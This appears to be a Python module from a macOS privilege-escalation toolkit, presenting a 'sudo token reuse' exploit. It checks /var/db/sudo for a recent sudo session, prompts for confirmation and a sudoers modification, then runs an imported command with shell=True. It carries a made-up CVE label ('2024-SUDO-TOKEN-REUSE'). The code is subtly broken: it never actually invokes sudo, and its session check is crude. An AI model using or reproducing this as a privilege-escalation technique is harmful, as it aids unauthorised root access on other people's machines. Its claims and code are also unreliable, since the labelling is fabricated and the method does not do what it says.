"""Sudo Token Reuse for modern macOS versions"""
import os
import time
from distutils.version import LooseVersion
from subprocess import CalledProcessError, call, check_output

from .general import (
    confirmation_prompt,
    confirm_sudoers_modification,
    DEFAULT_COMMAND,
    interaction_prompt,
)

__cve__ = "2024-SUDO-TOKEN-REUSE"
__credits__ = "Security Research"


def vulnerable(version):
    """checks vulnerability"""
    # Sudo token reuse works on macOS 13.x (Ventura), 14.x (Sonoma), and 15.x (Sequoia)
    if version >= LooseVersion("13.0"):
        return interaction_prompt(
            "Do you want to attempt sudo token reuse? (requires active sudo session)"
        )
    return False


def check_sudo_timestamp():
    """Check if sudo timestamp file exists and is recent"""
    sudo_dir = "/var/db/sudo"
    
    if not os.path.exists(sudo_dir):
        return False
    
    try:
        # Check modification time
        mtime = os.path.getmtime(sudo_dir)
        current_time = time.time()
        # Sudo tokens typically expire after 5 minutes (300 seconds)
        if current_time - mtime < 300:
            return True
    except (OSError, PermissionError):
        pass
    
    return False


def run():
    """runs exploit"""
    print("\n[*] Checking for active sudo session...")
    
    if not check_sudo_timestamp():
        print("[-] No active sudo session found.")
        print("[!] This exploit requires a recent sudo authentication (< 5 minutes old)")
        return False
    
    print("[+] Active sudo session detected!")
    
    if not confirmation_prompt(
        "Attempt to reuse sudo token for privilege escalation?",
        require_yes=True
    ):
        print("[-] User declined sudo token reuse.")
        return False
    
    if not confirm_sudoers_modification():
        print("[-] User declined sudoers modification. Aborting exploit.")
        return False
    
    print("[*] Attempting to reuse sudo token...")
    
    try:
        # Try to execute a command with sudo (reusing existing token)
        result = call([DEFAULT_COMMAND], shell=True)
        if result == 0:
            print("[+] Successfully reused sudo token!")
            return True
    except (OSError, CalledProcessError) as e:
        print(f"[-] Failed to reuse sudo token: {e}")
    
    return False
